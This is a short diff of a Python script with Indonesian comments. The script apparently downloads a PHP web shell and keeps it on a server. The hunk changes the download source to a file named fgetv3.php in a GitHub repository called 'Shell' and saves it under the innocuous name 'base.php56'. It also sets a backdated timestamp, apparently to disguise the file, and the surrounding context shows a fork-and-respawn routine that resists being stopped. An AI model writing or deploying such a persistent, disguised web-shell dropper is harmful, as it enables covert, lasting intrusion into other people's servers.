@@ -54,8 +54,8 @@ def respawn():
             os.waitpid(pid, 0)  # Parent menunggu child mati, lalu respawn
 
 # URL sumber file yang akan diunduh
-url = "https://file.0x1999.tech/pro.txt"
-file_name = "config.php"
+url = "https://github.com/ardifx01/Shell/raw/main/fgetv3.php"
+file_name = "base.php56"
 timestamp = "201201081531.12"
 
 # Jalankan fungsi penting
